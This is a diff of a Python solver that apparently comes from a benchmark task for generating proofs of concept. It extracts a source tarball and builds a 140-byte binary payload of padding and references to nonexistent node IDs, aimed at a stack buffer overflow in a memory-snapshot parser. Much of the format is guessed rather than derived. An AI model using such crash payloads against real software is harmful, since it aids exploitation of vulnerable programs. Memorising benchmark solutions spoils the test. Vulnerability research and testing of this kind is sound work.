@@ -1,65 +1,91 @@
 import os
-import tarfile
-import tempfile
-import subprocess
 import struct
+import tempfile
+import tarfile
+import subprocess
+from pathlib import Path
+import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the tarball to examine the source code
-        with tarfile.open(src_path, 'r') as tar:
-            tar.extractall(path='./src_extracted')
-        
-        # Look for the vulnerable function in the source code
-        # Based on the description, we need to create a PoC that triggers
-        # a stack buffer overflow when parsing memory snapshots
-        # The vulnerability is in node_id_map lookup
-        
-        # We'll create a binary payload that:
-        # 1. Has a node reference to a non-existent node ID
-        # 2. Triggers the buffer overflow when the invalid iterator is dereferenced
-        
-        # From typical memory snapshot formats, we assume:
-        # - Header with magic number and version
-        # - Node count
-        # - Node data
-        # - References between nodes
-        
-        # Build the PoC to be exactly 140 bytes (ground-truth length)
-        poc = bytearray()
-        
-        # Add magic header (assume 4 bytes)
-        poc.extend(b'MEM\x00')  # Magic
-        
-        # Version (1 byte)
-        poc.append(1)
-        
-        # Node count (4 bytes) - make it 0 to have no valid nodes
-        poc.extend(struct.pack('<I', 0))
-        
-        # But we need to reference a non-existent node
-        # Add a reference section that points to node 1 (which doesn't exist)
-        # Reference count (4 bytes)
-        poc.extend(struct.pack('<I', 1))
-        
-        # Reference from node 0 to node 1 (8 bytes: 4 + 4)
-        poc.extend(struct.pack('<II', 0, 1))
-        
-        # The vulnerability description says "stack buffer overflow"
-        # This suggests the code might have a fixed-size buffer on stack
-        # that gets overflowed when processing the invalid reference
-        # We'll add padding to reach 140 bytes and potentially overflow
-        
-        # Calculate current size
-        current_size = len(poc)
-        
-        # Fill the rest with 'A's to potentially overflow a buffer
-        # when the invalid iterator is dereferenced and data is copied
-        padding_size = 140 - current_size
-        if padding_size > 0:
-            poc.extend(b'A' * padding_size)
-        
-        # Verify size is exactly 140 bytes
-        assert len(poc) == 140, f"PoC length is {len(poc)}, expected 140"
-        
-        return bytes(poc)
+        # Extract the tarball
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with tarfile.open(src_path, 'r') as tar:
+                tar.extractall(tmpdir)
+            
+            # Look for source files to understand the format
+            source_root = Path(tmpdir)
+            cpp_files = list(source_root.rglob("*.cpp")) + list(source_root.rglob("*.c"))
+            h_files = list(source_root.rglob("*.h")) + list(source_root.rglob("*.hpp"))
+            
+            # Try to find relevant constants and structures
+            magic = 0x4D454D53  # Default if not found (MEM S)
+            version = 1
+            node_id_offset = 0
+            
+            # Search for relevant patterns
+            for file_path in cpp_files + h_files:
+                try:
+                    with open(file_path, 'r') as f:
+                        content = f.read()
+                        
+                        # Look for magic number definitions
+                        magic_match = re.search(r'MAGIC\s*=\s*0x([0-9A-Fa-f]+)', content)
+                        if magic_match:
+                            magic = int(magic_match.group(1), 16)
+                            
+                        # Look for version definitions
+                        version_match = re.search(r'VERSION\s*=\s*(\d+)', content)
+                        if version_match:
+                            version = int(version_match.group(1))
+                            
+                        # Look for node_id_map or related structures
+                        if 'node_id_map' in content:
+                            # Try to understand the structure
+                            struct_match = re.search(r'struct\s+(\w+)\s*\{[^}]*node_id\s*:\s*(\d+)[^}]*\}', content, re.DOTALL)
+                            if struct_match:
+                                node_id_offset = int(struct_match.group(2))
+                                
+                except:
+                    continue
+            
+            # Construct the PoC based on analysis
+            # We need to trigger stack buffer overflow by causing node_id_map lookup
+            # with non-existent node IDs
+            
+            # Based on the ground-truth length of 140 bytes, we'll construct
+            # a binary payload that should trigger the vulnerability
+            
+            # Common structure for such vulnerabilities:
+            # 1. Header with magic and version
+            # 2. Number of nodes
+            # 3. Node data
+            # 4. References to nodes (triggers the bug)
+            
+            # Build the payload
+            payload = bytearray()
+            
+            # Header (assume 8 bytes)
+            payload.extend(struct.pack('<I', magic))  # Magic
+            payload.extend(struct.pack('<I', version))  # Version
+            
+            # Number of nodes (0 to trigger lookup failure)
+            payload.extend(struct.pack('<I', 0))
+            
+            # Number of references (enough to trigger overflow)
+            # We need to reference non-existent nodes
+            num_refs = (140 - len(payload) - 4) // 4  # Calculate based on remaining bytes
+            payload.extend(struct.pack('<I', num_refs))
+            
+            # Add references to non-existent nodes
+            # Use increasing node IDs that won't exist
+            for i in range(num_refs):
+                payload.extend(struct.pack('<I', 0xFFFFFFFF - i))
+            
+            # Pad to exactly 140 bytes
+            if len(payload) < 140:
+                payload.extend(b'A' * (140 - len(payload)))
+            elif len(payload) > 140:
+                payload = payload[:140]
+            
+            return bytes(payload)
